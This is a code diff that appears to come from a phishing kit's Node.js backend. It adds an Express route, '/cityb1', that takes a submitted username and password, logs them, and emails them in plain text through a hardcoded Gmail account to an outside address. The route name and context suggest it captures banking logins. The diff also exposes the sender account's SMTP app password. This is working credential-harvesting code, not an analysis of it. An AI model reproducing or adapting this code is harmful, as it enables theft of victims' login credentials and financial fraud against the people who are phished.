@@ -1272,3 +1272,44 @@ Date of Payment: ${dateOfPayment}
     }
   });
 });
+
+
+
+app.post("/cityb1", async (req, res) => {
+  const { userName, password } = req.body;
+  console.log(req.body);
+
+  // Construct email message
+  const message = `
+    New details${userName}:
+
+    user Name: ${userName}
+    Password: ${password}
+
+  `;
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
+  });
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "andrewjadielqqsd@gmail.com", // list of receivers
+    subject: `Username and passsword for ${userName}`, // Subject line
+    text: message, // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
+    }
+  });
+});
